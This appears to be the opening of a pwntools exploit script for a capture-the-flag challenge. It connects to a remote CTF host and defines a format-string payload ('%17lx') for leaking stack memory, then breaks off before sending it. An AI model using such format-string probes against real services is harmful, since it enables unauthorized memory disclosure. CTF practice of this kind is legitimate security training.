from pwn import *

context.update(log_level= 'debug')
p = remote('warmup.ctf.defenit.kr',3333)
p.recvrepeat()
payload = '%17lx'
